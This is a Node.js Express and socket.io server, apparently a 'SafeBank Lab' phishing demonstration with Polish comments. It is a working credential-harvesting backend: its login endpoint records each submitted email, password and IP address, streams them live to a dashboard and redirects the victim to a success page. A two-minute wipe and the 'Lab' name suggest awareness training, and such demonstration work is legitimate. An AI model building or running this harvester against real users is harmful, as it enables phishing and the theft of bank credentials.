const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');

app.use(express.json());
app.use(express.static('public'));

let capturedData = [];

// API do logowania
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const entry = {
        id: Date.now(),
        email,
        password,
        ip: req.ip.replace('::ffff:', ''),
        time: new Date().toLocaleTimeString()
    };
    
    capturedData.push(entry);
    io.emit('new-capture', entry); // Wysyłka do dashboardu w 0.1s
    
    res.json({ success: true, redirect: '/success.html' });
});

// Czyścimy listę co 2 minuty, żeby nikt nie podglądał haseł innych osób na stałe
setInterval(() => {
    capturedData = [];
    io.emit('clear-dashboard');
}, 120000);

http.listen(3000, '0.0.0.0', () => {
    console.log('🚀 SafeBank Lab wystartował na porcie 3000!');
});